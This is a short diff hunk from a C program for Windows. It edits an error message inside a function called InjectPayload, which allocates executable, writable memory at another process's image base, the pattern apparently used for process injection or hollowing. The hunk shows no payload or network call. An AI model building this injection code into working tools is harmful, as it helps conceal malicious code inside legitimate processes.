@@ -183,7 +183,7 @@ BOOL InjectPayload(PROCESS_INFORMATION* pi, const BYTE* data, DWORD dataSize,
     LPVOID allocBase = VirtualAllocEx(pi->hProcess, (LPVOID)imageBase, sizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!allocBase) {
-        fprintf(stderr, "  [!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
+fprintf(stderr, "[-] Alloc failed: %lu\n", GetLastError());
         return FALSE;
     }
     *remoteBase = (DWORD64)allocBase;
